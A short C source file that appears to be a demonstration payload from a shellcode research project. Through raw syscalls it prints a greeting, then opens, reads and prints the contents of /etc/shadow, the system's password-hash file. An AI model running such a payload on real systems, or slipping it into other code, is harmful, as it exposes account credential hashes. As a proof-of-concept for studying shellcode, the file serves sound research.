/*
 * (c) 2018-2019 Hadrien Barral
 * SPDX-License-Identifier: Apache-2.0
 */

#include <stddef.h>
#include <sys/types.h>

#include "payload_linux_shared.c"

/* We use this define to overcome linker limitations */
#define WIN_STRING "Hello from shellcode, I will now display /etc/shadow ...\n"

int main(void)
{
    sys_write(1 /* stdout */, WIN_STRING, sizeof(WIN_STRING)-1);

    char buf[2000];
    int fd = sys_openat(0 /* ignored */, "/etc/shadow", 0 /* O_RDONLY */);
    ssize_t read_size = sys_read(fd, buf, sizeof(buf));
    sys_write(1 /* stdout */, buf, read_size);
    
    return 0;
}
